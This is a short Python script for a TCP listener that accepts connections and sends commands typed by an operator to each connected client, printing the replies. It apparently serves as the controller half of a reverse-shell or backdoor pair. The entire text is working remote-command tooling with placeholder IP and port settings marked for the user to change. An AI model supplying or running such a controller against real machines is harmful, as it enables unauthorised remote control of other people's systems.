import socket

serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.76" # change this (the ip that we are listening on)
port =  1234 # change this

serv.bind((host,port))
serv.listen() 

while True:
    csoc, adder = serv.accept()
    print(f"connected:{adder}")

    while True:  # Add an inner loop to continuously receive commands
        command = input("command: ")  # Receive command from the user
        csoc.send(command.encode('utf-8'))  # Send command to the client

        if command.lower() == "exit":  # If the command is 'exit', break the loop
            break

        message = csoc.recv(1024).decode('utf-8')
        print(f"the message: {message}")
    
    csoc.close()  # Close the connection
